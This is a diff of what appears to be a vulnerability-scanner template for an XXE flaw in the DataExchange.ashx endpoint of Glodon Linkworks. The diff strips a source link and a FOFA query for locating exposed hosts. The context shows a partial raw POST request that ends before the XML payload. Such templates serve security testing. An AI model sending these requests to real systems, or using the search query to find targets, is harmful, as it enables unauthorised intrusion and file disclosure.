@@ -3,12 +3,8 @@ info:
   name: 广联达Linkworks DataExchange.ashx XXE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/oev111ce523swx6e'
+  description: ''
   tags: xxe,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: oev111ce523swx6e
-    fofa: body="Services/Identification/login.ashx" || header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"
 http:
 - raw:
   - 'POST /GB/LK/Document/DataExchange/DataExchange.ashx HTTP/1.1
@@ -35,14 +31,10 @@ http:
     Sec-Purpose: prefetch;prerender
 
 
-
-
     ------WebKitFormBoundaryJGgV5l5ta05yAIe0
 
 
     Content-Disposition: form-data;name="SystemName"
-
-
 
 
     BIM
@@ -55,8 +47,6 @@ http:
 
 
     Content-Type: text/plain
-
-
 
 
     <?xml version="1.0" encoding="UTF-8"?>
